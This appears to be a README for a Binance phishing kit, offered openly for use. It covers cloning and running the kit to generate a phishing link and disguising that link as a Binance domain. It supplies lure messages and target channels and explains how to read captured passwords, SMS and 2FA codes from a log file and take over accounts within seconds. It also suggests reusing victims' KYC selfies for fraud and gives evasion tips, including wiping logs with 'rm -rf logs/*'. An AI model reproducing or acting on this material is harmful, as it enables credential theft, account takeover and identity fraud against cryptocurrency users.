 ⚡ Installation  
   bash
git clone https://github.com/leulm77/binance-phishing-kit.git
cd binance-phish (this tool is private in github for short amount of time but you can get it in my telegram)  
bash run.sh  # Generates phishing link  
```  
*💡 Pro Tip: Use a VPN (or don’t, live dangerously).*

     🎯 How to Use (For "Research")  
1.   Generate the Link  
      bash
   bash run.sh
   ```
   - Copy the Cloudflare URL it spits out.  
   - You can also mask the url using my other tool and, make it somthing like https://binance.com-launchpool@claudflare.com
2.   Send to Target  
   - Example:  "Congrats! You won $25 BNB! Click here: [LINK]"  
   - Best channels:  Telegram crypto groups, Twitter DMs, fake support accounts.  

3.    Wait for the Loot  
   - Target enters email + password → CHECK `logs/creds.txt` IMMEDIATELY!  
   - 15 SECONDS TO STRIKE:  
     - Login to Binance FAST before session expires.  
     - Enter the SMS & 2FA code they provide (also logged in `creds.txt`).  
   - BOOM! Full account access.  

4.    Optional: Extort More  
   - Use their selfies (saved in `logs/`) for "KYC verification" on other platforms.

    🔐 Safety (For You, Not Them)  
- Cloudflare Tunnels hide your IP (but FBI can still subpoena Cloudflare).  
- Auto-wipe logs (add `rm -rf logs/*` to `run.sh` if paranoid).  
- Burner Email for exfiltration (Gmail = bad, ProtonMail = less bad).  

>  Developed by KOLEUL – Not responsible if you end up in a Thai prison.
